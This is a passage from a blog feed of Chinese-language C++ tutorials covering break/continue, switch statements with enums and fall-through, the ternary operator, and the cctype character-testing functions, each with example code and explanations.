7</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>代码解释:</strong></p><ol><li> 在 <code>for</code> 循环中，当 <code>i</code> 是偶数时（<code>i % 2 == 0</code> 为真），<code>continue</code> 语句执行。它跳过了 <code>std::cout &lt;&lt; i &lt;&lt; &quot; &quot;;</code> 这行代码，直接执行更新表达式 <code>++i</code>，然后判断循环条件 <code>i &lt;= 10</code>。因此，只有奇数被打印出来。</li><li> 在 <code>while</code> 循环中，当 <code>k</code> 递增到 5 时，<code>if</code> 条件满足，<code>continue</code> 执行，跳过了 <code>std::cout &lt;&lt; k &lt;&lt; &quot; &quot;;</code>，直接回到 <code>while (k &lt; 7)</code> 的条件判断。</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>  <code>break</code>: 完全<strong>终止</strong>最内层的循环或 <code>switch</code>。</li><li>  <code>continue</code>: <strong>跳过</strong>当前循环迭代的剩余部分，进入<strong>下一次迭代</strong>（如果循环条件允许）。</li></ul><p>这两个语句可以使循环控制更加灵活，但过度使用可能会降低代码的可读性。通常，可以通过调整循环条件或使用 <code>if</code> 语句来避免一些不必要的 <code>break</code> 或 <code>continue</code>。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>6.5 switch 语句</title>
      <link href="2025/04/26/6.5_switch%E8%AF%AD%E5%8F%A5/"/>
      <url>2025/04/26/6.5_switch%E8%AF%AD%E5%8F%A5/</url>
      
        <content type="html"><![CDATA[<p><code>switch</code> 语句是 C++ 中另一种用于控制程序流程的分支结构。它允许程序根据一个表达式的值从多个代码块中选择一个来执行。<code>switch</code> 语句通常用于替代冗长的 <code>if else if else</code> 结构，特别是当判断条件基于单个变量或表达式的离散值时。</p><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><p><code>switch</code> 语句的基本语法如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (expression) &#123;</span><br><span class="line">    <span class="keyword">case</span> constant_expression_1:</span><br><span class="line">        <span class="comment">// code block to be executed if expression equals constant_expression_1</span></span><br><span class="line">        <span class="keyword">break</span>; <span class="comment">// 可选，但通常需要</span></span><br><span class="line">    <span class="keyword">case</span> constant_expression_2:</span><br><span class="line">        <span class="comment">// code block to be executed if expression equals constant_expression_2</span></span><br><span class="line">        <span class="keyword">break</span>; <span class="comment">// 可选</span></span><br><span class="line">    <span class="comment">// ... 可以有更多的 case</span></span><br><span class="line">    <span class="keyword">default</span>: <span class="comment">// 可选</span></span><br><span class="line">        <span class="comment">// code block to be executed if expression doesn&#x27;t match any case</span></span><br><span class="line">        <span class="keyword">break</span>; <span class="comment">// 可选</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>工作方式:</strong></p><ol><li> 首先计算 <code>switch</code> 括号内的 <code>expression</code>（表达式）。这个表达式必须得出一个整数类型（如 <code>int</code>, <code>char</code>, <code>enum</code>）或可以隐式转换为整数类型的值。</li><li> 程序将 <code>expression</code> 的值与每个 <code>case</code> 后面跟着的 <code>constant_expression</code>（常量表达式）进行比较。</li><li> 如果找到匹配的 <code>case</code>，则执行该 <code>case</code> 标签下的代码块。</li><li> <code>break</code> 语句的作用是跳出 <code>switch</code> 结构。如果没有 <code>break</code>，程序会继续执行下一个 <code>case</code> 的代码块（称为“贯穿”），直到遇到 <code>break</code> 或 <code>switch</code> 语句结束。</li><li> <code>default</code> 标签是可选的。如果 <code>expression</code> 的值与所有 <code>case</code> 的常量表达式都不匹配，则执行 <code>default</code> 标签下的代码块。如果没有 <code>default</code> 标签且没有匹配的 <code>case</code>，则 <code>switch</code> 语句不执行任何操作。</li></ol><p><strong>重要限制:</strong></p><ul><li>  <code>case</code> 标签后面的值必须是常量表达式（如字面值 <code>10</code>、<code>&#39;A&#39;</code> 或 <code>const</code> 整数变量，或者枚举量）。不能是变量或非常量表达式。</li><li>  <code>expression</code> 的结果必须是整数类型（<code>int</code>, <code>char</code>, <code>short</code>, <code>long</code>, <code>long long</code>, <code>bool</code>, <code>enum</code> 等）。不能是浮点数 (<code>float</code>, <code>double</code>) 或字符串 (<code>std::string</code>)。</li></ul><h2 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> choice;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter a number (1-3): &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; choice;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (choice) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You chose option 1.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">// 跳出 switch</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You chose option 2.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">// 跳出 switch</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You chose option 3.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">// 跳出 switch</span></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Invalid choice.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="comment">// default 后面通常也放 break，虽然在这里不是必需的，但保持一致性是好习惯</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 演示没有 break 的情况 (贯穿)</span></span><br><span class="line">    <span class="keyword">char</span> grade = <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nGrade example (fall-through):&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">switch</span> (grade) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;A&#x27;</span>:</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Excellent! &quot;</span>;</span><br><span class="line">            <span class="comment">// 没有 break</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>:</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Good! &quot;</span>;</span><br><span class="line">            <span class="comment">// 没有 break</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>:</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Passing. &quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">// 在这里跳出</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;D&#x27;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;F&#x27;</span>: <span class="comment">// 可以将多个 case 关联到同一代码块</span></span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Needs improvement. &quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Invalid grade. &quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: Good! Passing.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>代码解释:</strong></p><ol><li> 第一个 <code>switch</code> 根据用户输入的 <code>choice</code> 值执行相应的 <code>case</code>。<code>break</code> 语句确保只执行匹配 <code>case</code> 的代码。如果输入不是 1、2 或 3，则执行 <code>default</code> 部分。</li><li> 第二个 <code>switch</code> 演示了“贯穿”行为。因为 <code>case &#39;A&#39;</code> 和 <code>case &#39;B&#39;</code> 后面没有 <code>break</code>，当 <code>grade</code> 为 <code>&#39;B&#39;</code> 时，程序会执行 <code>case &#39;B&#39;</code> 的代码 (<code>std::cout &lt;&lt; &quot;Good! &quot;;</code>)，然后继续执行 <code>case &#39;C&#39;</code> 的代码 (<code>std::cout &lt;&lt; &quot;Passing. &quot;;</code>)，直到遇到 <code>case &#39;C&#39;</code> 中的 <code>break</code> 才跳出 <code>switch</code>。同时，它也展示了如何将多个 <code>case</code>（<code>&#39;D&#39;</code> 和 <code>&#39;F&#39;</code>）关联到同一个代码块。</li></ol><h2 id="6-5-1-将枚举量用作标签"><a href="#6-5-1-将枚举量用作标签" class="headerlink" title="6.5.1 将枚举量用作标签"></a>6.5.1 将枚举量用作标签</h2><p>枚举 (<code>enum</code>) 类型的值是整数常量，因此非常适合用作 <code>switch</code> 语句的 <code>case</code> 标签，这可以提高代码的可读性。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个枚举类型表示颜色</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">Color</span> &#123;</span> RED, GREEN, BLUE, YELLOW &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Color selectedColor = GREEN;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (selectedColor) &#123;</span><br><span class="line">        <span class="keyword">case</span> RED:</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The color is Red.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> GREEN:</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The color is Green.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 这将被执行</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> BLUE:</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The color is Blue.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">// 注意：如果 case 覆盖了所有枚举量，可以省略 default，</span></span><br><span class="line">        <span class="comment">// 但如果枚举可能扩展，或者你想处理无效值，最好加上 default。</span></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Unknown color.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用枚举量作为 <code>case</code> 标签比直接使用魔法数字（如 0, 1, 2）更清晰易懂。</p><h2 id="6-5-2-switch-和-if-else"><a href="#6-5-2-switch-和-if-else" class="headerlink" title="6.5.2 switch 和 if else"></a>6.5.2 switch 和 if else</h2><p><code>switch</code> 语句可以看作是特定类型的 <code>if else if else</code> 结构的替代品，即判断条件都基于同一个整数表达式的值。</p><p><strong>何时使用 <code>switch</code>:</strong></p><ul><li>  当需要根据单个整数表达式的多个<strong>特定离散值</strong>进行分支时。</li><li>  当分支逻辑清晰，可以提高可读性时。</li></ul><p><strong>何时使用 <code>if else if else</code>:</strong></p><ul><li>  当判断条件涉及<strong>范围</strong>（例如 <code>age &gt; 18 &amp;&amp; age &lt; 60</code>）时。</li><li>  当判断条件涉及<strong>浮点数</strong>或<strong>字符串</strong>比较时。</li><li>  当判断条件比较复杂，涉及多个不同变量或逻辑运算时。</li><li>  当只有一个或两个分支时，<code>if else</code> 可能更简洁。</li></ul><p><strong>示例比较:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用 if else if</span></span><br><span class="line"><span class="keyword">int</span> num = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (num == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;One&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (num == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Two&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 执行</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (num == <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Three&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Other&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 switch (等效)</span></span><br><span class="line"><span class="keyword">switch</span> (num) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;One&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Two&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 执行</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Three&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Other&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于这种基于单个整数值的多路分支，<code>switch</code> 通常被认为更清晰、有时效率也可能更高（编译器可能将其优化为跳转表）。但对于涉及范围或非整数类型的判断，则必须使用 <code>if else if</code> 结构。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>6.4 三元运算符</title>
      <link href="2025/04/26/6.4_%E4%B8%89%E5%85%83%E8%BF%90%E7%AE%97%E7%AC%A6/"/>
      <url>2025/04/26/6.4_%E4%B8%89%E5%85%83%E8%BF%90%E7%AE%97%E7%AC%A6/</url>
      
        <content type="html"><![CDATA[<p>C++ 提供了一个简洁的条件运算符，称为三元运算符（或条件运算符），它是 C++ 中唯一一个需要三个操作数的运算符。它通常用于根据条件将两个值中的一个赋给变量。</p><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><p>三元运算符的语法如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">condition ? expression1 : expression2;</span><br></pre></td></tr></table></figure><p>其工作方式是：</p><ol><li> 首先计算 <code>condition</code>。</li><li> 如果 <code>condition</code> 为 <code>true</code>（非零），则计算 <code>expression1</code>，并且整个表达式的值就是 <code>expression1</code> 的值。</li><li> 如果 <code>condition</code> 为 <code>false</code>（零），则计算 <code>expression2</code>，并且整个表达式的值就是 <code>expression2</code> 的值。</li></ol><p>三元运算符通常可以替代简单的 <code>if else</code> 语句，使代码更紧凑。</p><h2 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h2><p>下面是一个使用三元运算符查找两个数中较大值的示例：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">int</span> max_val;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用三元运算符找出 a 和 b 中的较大值</span></span><br><span class="line">    max_val = (a &gt; b) ? a : b;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The maximum value between &quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot; and &quot;</span> &lt;&lt; b &lt;&lt; <span class="string">&quot; is: &quot;</span> &lt;&lt; max_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: The maximum value between 10 and 20 is: 20</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 另一个例子：根据年龄判断是否成年</span></span><br><span class="line">    <span class="keyword">int</span> age = <span class="number">15</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> status = (age &gt;= <span class="number">18</span>) ? <span class="string">&quot;Adult&quot;</span> : <span class="string">&quot;Minor&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Age: &quot;</span> &lt;&lt; age &lt;&lt; <span class="string">&quot;, Status: &quot;</span> &lt;&lt; status &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: Age: 15, Status: Minor</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>代码解释:</strong></p><ol><li> 在第一个示例中，条件 <code>(a &gt; b)</code> 被评估。因为 <code>10 &gt; 20</code> 是 <code>false</code>，所以计算第二个表达式 <code>b</code>，并将 <code>b</code> 的值（即 <code>20</code>）赋给 <code>max_val</code>。</li><li> 在第二个示例中，条件 <code>(age &gt;= 18)</code> 被评估。因为 <code>15 &gt;= 18</code> 是 <code>false</code>，所以计算第二个表达式 <code>&quot;Minor&quot;</code>，并将这个字符串赋给 <code>status</code>。</li></ol><p><strong>优点:</strong></p><ul><li>  <strong>简洁性:</strong> 可以用一行代码替代多行的 <code>if else</code> 结构，使代码更紧凑。</li></ul><p><strong>缺点:</strong></p><ul><li>  <strong>可读性:</strong> 对于复杂的条件或表达式，使用三元运算符可能会降低代码的可读性。在这种情况下，使用 <code>if else</code> 语句通常更好。</li></ul><p>三元运算符是 C++ 中一个方便的工具，尤其适用于简单的条件赋值。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>6.3 字符函数库cctype</title>
      <link href="2025/04/26/6.3_%E5%AD%97%E7%AC%A6%E5%87%BD%E6%95%B0%E5%BA%93cctype/"/>
      <url>2025/04/26/6.3_%E5%AD%97%E7%AC%A6%E5%87%BD%E6%95%B0%E5%BA%93cctype/</url>
      
        <content type="html"><![CDATA[<p>C++ 继承了 C 语言的一个非常有用的函数库，用于处理字符。这个库的 C++ 头文件是 <code>&lt;cctype&gt;</code>，对应的 C 头文件是 <code>&lt;ctype.h&gt;</code>。它提供了一系列函数，可以方便地检查字符的类别（例如，是否是字母、数字、标点符号、空白等）以及转换字符的大小写。</p><p>这些函数通常接收一个 <code>int</code> 类型的参数（该参数值应能表示为 <code>unsigned char</code> 或等于 <code>EOF</code>），并返回一个 <code>int</code> 值。对于测试函数，返回非零值（通常解释为 <code>true</code>）表示条件满足，返回零值（解释为 <code>false</code>）表示条件不满足。对于转换函数，返回转换后的字符的整数表示。</p><p><strong>包含头文件:</strong></p><p>要使用这些函数，需要包含 <code>&lt;cctype&gt;</code> 头文件：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cctype&gt;</span></span></span><br></pre></td></tr></table></figure><p><strong>常用的字符测试函数:</strong></p><table><thead><tr><th align="left">函数名</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><code>isalnum(ch)</code></td><td align="left">如果 <code>ch</code> 是字母（<code>isalpha</code>）或数字（<code>isdigit</code>），返回 <code>true</code>。</td></tr><tr><td align="left"><code>isalpha(ch)</code></td><td align="left">如果 <code>ch</code> 是字母（大写或小写），返回 <code>true</code>。</td></tr><tr><td align="left"><code>isblank(ch)</code></td><td align="left">(C++11) 如果 <code>ch</code> 是标准空白字符（通常是空格或水平制表符 <code>\t</code>），返回 <code>true</code>。</td></tr><tr><td align="left"><code>iscntrl(ch)</code></td><td align="left">如果 <code>ch</code> 是控制字符（例如 <code>\n</code>, <code>\t</code>, ASCII 0-31 和 127），返回 <code>true</code>。</td></tr><tr><td align="left"><code>isdigit(ch)</code></td><td align="left">如果 <code>ch</code> 是十进制数字（’0’ 到 ‘9’），返回 <code>true</code>。</td></tr><tr><td align="left"><code>isgraph(ch)</code></td><td align="left">如果 <code>ch</code> 是除空格外的任何可打印字符，返回 <code>true</code>。</td></tr><tr><td align="left"><code>islower(ch)</code></td><td align="left">如果 <code>ch</code> 是小写字母，返回 <code>true</code>。</td></tr><tr><td align="left"><code>isprint(ch)</code></td><td align="left">如果 <code>ch</code> 是任何可打印字符（包括空格），返回 <code>true</code>。</td></tr><tr><td align="left"><code>ispunct(ch)</code></td><td align="left">如果 <code>ch</code> 是标点符号（<code>isgraph</code> 为 <code>true</code> 但 <code>isalnum</code> 为 <code>false</code>），返回 <code>true</code>。</td></tr><tr><td align="left"><code>isspace(ch)</code></td><td align="left">如果 <code>ch</code> 是标准空白字符（空格、换页 <code>\f</code>、换行 <code>\n</code>、回车 <code>\r</code>、水平制表符 <code>\t</code>、垂直制表符 <code>\v</code>），返回 <code>true</code>。</td></tr><tr><td align="left"><code>isupper(ch)</code></td><td align="left">如果 <code>ch</code> 是大写字母，返回 <code>true</code>。</td></tr><tr><td align="left"><code>isxdigit(ch)</code></td><td align="left">如果 <code>ch</code> 是十六进制数字（’0’-‘9’, ‘a’-‘f’, ‘A’-‘F’），返回 <code>true</code>。</td></tr></tbody></table><p><strong>用法与示例 (测试函数):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cctype&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> text = <span class="string">&quot;Hello World! 123\t&quot;</span>;</span><br><span class="line">    <span class="keyword">int</span> alpha_count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> digit_count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> punct_count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> space_count = <span class="number">0</span>;</span><br><span class="line"></span><br><span 